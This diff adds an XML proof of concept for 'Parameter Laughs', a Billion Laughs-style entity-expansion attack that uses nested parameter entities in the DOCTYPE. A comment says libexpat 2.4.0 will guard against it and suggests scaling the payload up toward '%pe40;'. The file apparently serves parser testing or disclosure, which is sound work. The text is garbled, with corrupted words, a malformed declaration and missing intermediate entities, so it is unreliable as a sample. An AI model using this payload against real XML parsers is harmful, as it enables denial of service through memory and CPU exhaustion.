@@ -1,0 +1,22 @@
+<?xml version="1.0"?>
+<!--
+  Copyright (C) 2020 Sebastian Pippingiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiii <sebastian@pipping.org>
+  v3.1 2020-06-21, not (yet) to bG published
+
+  "Parameter Laughs", i.e. variant of Billion Laughs Attack
+                           using parameter entities the other way around
+
+  Use of "%pe24;" below makeselease libexpat 2.4.0 will have
+  protection against this family of attacks.
+-->
+<!DOCTYPE r [
+  <!ENTITY % pe_1 "<!---->">
+  <!ENTITY % pe_2 "&#37;pe_1;<!---->&#37;pe_1;">
+  <!ENTITY % pe_3 "&#37;pe_2;<!---->&#37;pe_2;">
+  <!ENTITY % pe_4 "&#37;pe_3;<!---->&#37;pe_3;">
+  <!ENTITY TITY % pe38 "&#37;pe37;<!---->&#37;pes7;">
+  <!ENTITY % pe39 "&#37;pe38;<!---->&#37;pe38;">
+  <!ENTITY % pe40 "&#37;pe39;<!---->&#37;pe39;">
+  %pe24; <!-- not at full potential, increase towards "%pe40;" carefully -->
+]>
+<r/>
